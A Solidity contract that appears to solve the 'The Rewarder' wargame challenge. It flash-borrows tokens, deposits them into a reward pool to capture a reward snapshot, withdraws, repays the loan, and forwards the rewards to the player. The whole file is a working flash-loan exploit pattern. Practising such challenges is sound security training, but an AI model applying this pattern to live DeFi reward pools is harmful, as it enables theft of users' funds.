// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../DamnValuableToken.sol";
import  "./TheRewarderPool.sol";
//import "./RewardToken.sol";
import "./FlashLoanerPool.sol";
import "hardhat/console.sol";


contract rewarder {
    TheRewarderPool Rewarderpool;
    FlashLoanerPool Flashloan;
    DamnValuableToken LiquidToken;
    address player;
    RewardToken rdtoken;
    address rd;
    constructor(address _rd,address flashloan,address lq,address _player){
        Rewarderpool = TheRewarderPool(_rd);
        Flashloan = FlashLoanerPool(flashloan);
        LiquidToken = DamnValuableToken(lq);
        player = _player;
        //rd =_rd;
    }
    function receiveFlashLoan(uint256 amount) public {
        //授权用来deposit
        console.log("111111");
        LiquidToken.approve(address(Rewarderpool), amount);
        Rewarderpool.deposit(amount);
        console.log("33333");
        Rewarderpool.withdraw(amount);
        //还钱
        LiquidToken.transfer(msg.sender, amount);
        
    }
    function onflash(uint amount) public{
        Flashloan.flashLoan(amount);
    }
    function withdraw()public {
        rdtoken = RewardToken(Rewarderpool.rewardToken());
        //rdtoken.approve(player, rdtoken.balanceOf(address(this)));
        rdtoken.transfer(player, rdtoken.balanceOf(address(this)));
    }
}